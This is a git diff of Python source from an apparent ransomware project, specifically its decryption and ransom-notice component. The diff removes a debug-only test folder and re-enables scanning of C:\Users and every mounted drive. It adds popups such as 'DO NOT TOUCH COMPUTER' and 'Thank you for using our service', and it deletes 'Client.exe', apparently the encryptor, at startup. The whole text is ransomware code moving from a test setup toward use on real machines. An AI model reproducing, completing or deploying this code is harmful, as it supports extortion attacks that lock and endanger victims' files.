@@ -23,10 +23,9 @@ ThreadPool=[]
 IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()
 
 PathList=[]
-PathList_DEBUG=[]
 
 entry=0
-
+removeTarget="Client.exe"
 filePath=sys.argv[0]
 
 def setDecryptModule(privateKeyAES):
@@ -70,15 +69,13 @@ class Decryptor:
             print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")
 
 def listUpTargetDir():
-    global PathList, PathList_DEBUG
-    #PathList=[r"C:\Users\\"]
-    #for letter in range(97, 123):
-    #    drive=f"{chr(letter)}:\\"
-    #    if (pathlib.Path(drive).exists()):
-    #        PathList.append(drive)
-    #PathList.remove("c:\\")
-    #print(f"[DEBUG] PathList: {PathList}")
-    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\test"]
+    global PathList
+    PathList=[r"C:\Users\\"]
+    for letter in range(97, 123):
+        drive=f"{chr(letter)}:\\"
+        if (pathlib.Path(drive).exists()):
+            PathList.append(drive)
+    PathList.remove("c:\\")
 
 
 def recursiveDecrypt(basepath):
@@ -104,18 +101,19 @@ def decryptComputer():
         AESKey=base64.b64decode(buf[10:])
         setDecryptModule(AESKey)
         print("Start Decryption... Do not turn off computer...")
-        start=time.time()
-        for drive in PathList_DEBUG:
+        th=Thread(target=warningInProgress)
+        th.start()
+        for drive in PathList:
             recursiveDecrypt(drive)
             while (len(ThreadPool)!=0):
                 th=ThreadPool.pop()
                 th.join()
-        end=time.time()
-        print(end-start)
+        th2=Thread(target=completeDecryption)
+        th2.start()
         print("User computer is unlocked! Thank you for using our service:):):):):) Bye!")
         
         sleep(10)
-        os.remove(filePath)
+        sys.exit(0)
     except Exception as e:
         print("AESKey is not correct!", e)
         
@@ -143,6 +141,18 @@ def ransomewareWarning():
     
     WINDOW.mainloop()
 
+def warningInProgress():
+    WINDOW=tkinter.Tk()
+    WINDOW.withdraw()
+    messagebox.showerror("DO NOT TOUCH COMPUTER", "Decryption is working...")
+   
+def completeDecryption():
+    WINDOW=tkinter.Tk()
+    WINDOW.withdraw()
+    messagebox.showerror("User computer is unlocked!", "Thank you for using our service:):):):):) Bye!")
+
 if __name__=='__main__':
+    sleep(1)
+    os.remove(removeTarget)
     listUpTargetDir()
     ransomewareWarning()
